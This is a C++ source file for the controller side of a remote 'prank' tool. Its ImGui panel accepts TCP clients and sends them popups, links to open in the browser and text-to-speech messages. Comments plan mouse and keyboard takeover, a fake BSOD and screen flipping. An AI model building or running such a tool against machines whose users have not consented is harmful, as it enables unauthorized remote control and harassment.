#include "ip.h"
#include "../../packet.h"
#include <GLFW/glfw3.h>
#include "imgui.h"
#include "imgui_impl_glfw.h"
#include "imgui_impl_opengl3.h"
#include <chrono>
#include <iostream>
#include <asio.hpp>
#include <mutex>
#include <shared_mutex>
#include <thread>
#include <map>
#include <memory>

using asio::ip::tcp;


class Client {
private:
    tcp::socket socket_;

public:
    Client(tcp::socket socket)
        : socket_(std::move(socket)) {}

    void send(Packet packet) {
        asio::write(socket_, asio::buffer(&packet, sizeof(packet)));
    }

    Packet receive(packet_id request_id) {

        Packet packet{};
        packet.id = packet_id::GET_DATA;
        packet.packetid = request_id;
    
        send(packet);
    
        Packet incoming{};
        asio::read(socket_, asio::buffer(&incoming, sizeof(Packet)));
    
        return incoming;
    }
};

class Server {
private:
    std::mutex client_mutex_;  
    std::shared_mutex shared_client_mutex_;
    asio::io_context io_context_;
    tcp::acceptor acceptor_;
    int current_id_;
    std::map<int, std::unique_ptr<Client>> clients_;

public:
    int selected_client = -1;

    Server(const std::string& address, unsigned short port)
        : acceptor_(io_context_, tcp::endpoint(asio::ip::make_address(address), port)),
          current_id_(0) {}

    void handle_client_connect() {
        while(true) {
            auto socket = std::make_unique<tcp::socket>(io_context_);
            asio::error_code ec;
            ec = acceptor_.accept(*socket, ec);
            if (ec) continue;
            
            std::lock_guard<std::mutex> lock(client_mutex_);
            auto client = std::make_unique<Client>(std::move(*socket));
            clients_[current_id_++] = std::move(client);
        }
    }

    void send_to_client(int id, Packet packet) {
        std::lock_guard<std::mutex> lock(client_mutex_);
        try {
            if(id == -1) {
                std::cout << "Please select a client";
                return;
            }
            if (clients_.count(id)) {
                clients_[id]->send(packet);
            }
        } catch (const std::exception& e ) {
            std::cout << "That client does not exist \n";
        }
    }

    void all_client_send(Packet packet) {
        std::lock_guard<std::mutex> lock(client_mutex_);
        for(const auto& pair : clients_) {
            pair.second->send(packet);
        }
    }


    void check_if_client_alive() {
        while (true) {
            std::map<int, std::unique_ptr<Client>> still_alive;
    
            {
                std::lock_guard<std::mutex> lock(client_mutex_);
                for (auto& [id, client] : clients_) {
                    try {
                        Packet result = client->receive(packet_id::GET_DATA);
                        if (result.number == 1) {
                            still_alive[id] = std::move(client);  
                        } else {
                            std::cerr << "Client " << id << " returned unexpected data\n";
                        }
                    } catch (const std::exception& e) {
                        std::cerr << "Client " << id << " failed ping: " << e.what() << "\n";
                    }
                }
    
                clients_ = std::move(still_alive);
            }
    
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }

    std::vector<int> get_connected_clients() {
        std::shared_lock<std::shared_mutex> lock(shared_client_mutex_);
        std::vector<int> cl;
        for(const auto& pair : clients_) {
            cl.push_back(pair.first);
        }
        return cl;
    }

    bool is_client_connected(int selected_client) {
        std::lock_guard<std::mutex> lock(client_mutex_);
        auto connected = get_connected_clients();
        if (std::find(connected.begin(), connected.end(), selected_client) == connected.end()) {
            return false;
        }
        return true;
    }
};

class Send_Field {
    private:
        char text_buffer[256] = "";
        Server& server;
        int selected_client;
        std::string lable;
        packet_id packetId;
    public:
    Send_Field(std::string lable_, packet_id packetId_, Server& server_) : server(server_), lable(lable_), packetId(packetId_) {}

    void draw() {
        selected_client = server.selected_client;
    
        ImGui::Text(lable.c_str());
        ImGui::SameLine();
    
        std::string input_id = "##input_" + lable;
        bool enter_pressed = ImGui::InputText(input_id.c_str(), text_buffer, sizeof(text_buffer), ImGuiInputTextFlags_EnterReturnsTrue);
    
        ImGui::SameLine();
        std::string button_id = "Send##" + lable;
        if (ImGui::Button(button_id.c_str()) || enter_pressed) {
            if (server.is_client_connected(selected_client)) {
                Packet packet{packetId};
                std::strcpy(packet.str, text_buffer);
                server.send_to_client(selected_client, packet);
                std::strcpy(text_buffer, "");
            } else if (selected_client == -1) {
                std::cout << "Please select a client";
            } else {
                std::cout << "Client no longer connected\n";
            }
        }
    }
};


int main() {

    if (!glfwInit()) return -1;
    GLFWwindow* w = glfwCreateWindow(640, 480, "control pannel", 0, 0);
    if (!w) return glfwTerminate(), -1;
    glfwMakeContextCurrent(w);
    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGui_ImplGlfw_InitForOpenGL(w, true);
    ImGui_ImplOpenGL3_Init();
    ImGui::StyleColorsDark();
    
    static ImVec4 background_color = ImVec4(0.102f, 0.102f, 0.102f, 1.0f);

    Server server{ip, 1234};


    std::thread accept_thread([&server]() {
        server.handle_client_connect();
    });
    accept_thread.detach();
    std::thread alive_thread([&server]() {
        server.check_if_client_alive();
    });
    alive_thread.detach();
    
    Send_Field popup{"Popup", packet_id::POPUP, server};
    Send_Field open_link{"Open link", packet_id::OPEN_LINK, server};
    Send_Field tts{"Send tts", packet_id::TTS, server};

    while (!glfwWindowShouldClose(w)) {
   //     std::cout << "main loop start\n"; 
        glfwPollEvents();
        ImGui_ImplOpenGL3_NewFrame();
        ImGui_ImplGlfw_NewFrame();

        ImGui::NewFrame();
        
        // std::cout << "get connected clients start\n"; 

        ImGui::Begin("Send Data");
        /*
            d open an image from a link
                - or maybe send the image to be downloaded and then shown
            d send a pop up with a message of my choosing
                - group mode (a few pop ups)
                - life bar (how many times you have to close the popup before it does not come back)
                - infinite life mode
                - create popup that avoids the mouse

            d send link which gets opened in a browseien
            d send tts message
        */
        //std::cout << "before popup\n";
            popup.draw();
            open_link.draw();
            tts.draw();
        ImGui::End();

        ImGui::Begin("Mouse");
        /*
            - make mouse move randomly (t)
            - inverted mouse (t)
            - lock mouse to a small box
        */

        ImGui::End();

        ImGui::Begin("Keyboard");
        /*
            - send message to be typed by the user's keyboard
            - echo keyboard (repeats what was typed after a few seconds)
            - make it so keyboard presses become a random key (t)
        */
        ImGui::End();

        ImGui::Begin("Visual & Sound");
        /*
            - flip screen (0, 90, 180, 270)
            - set system volume
            - fake BSOD 
            - screen tint (send a color to recolor the screen)
        */
        ImGui::End();


        ImGui::Begin("Manage");
        /*
            - Start/Stop all button
            - A target selector
            - A auto mode which does pranks automatically
            - A log of pranks ran
            - Add a prank schedual
        */
            std::vector<int> clients = server.get_connected_clients();

                for(auto id : clients) {
                    std::string lable = "Client: " + std::to_string(id);

                    if(server.selected_client == id) {
                        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.2f, 0.6f, 0.9f, 1.0f));
                    }

                    if(ImGui::Button(lable.c_str())) {
                        std::cout << "selected client: " << id << "\n";
                        server.selected_client = id;
                    }

                    if(server.selected_client == id) {
                        ImGui::PopStyleColor(1); 
                    }
                }
        ImGui::End();

        ImGui::Begin("customize");
            ImGui::ColorPicker3("Background", (float*)&background_color);
        ImGui::End();

        ImGui::Render();
        int w_, h_; glfwGetFramebufferSize(w, &w_, &h_);
        glViewport(0, 0, w_, h_);
        glClearColor(background_color.x, background_color.y, background_color.z, 1.0f);
        glClear(GL_COLOR_BUFFER_BIT);
        ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());
        glfwSwapBuffers(w);
    }

    ImGui_ImplOpenGL3_Shutdown();
    ImGui_ImplGlfw_Shutdown();
    ImGui::DestroyContext();
    glfwDestroyWindow(w);
    glfwTerminate();
    return 0;
}
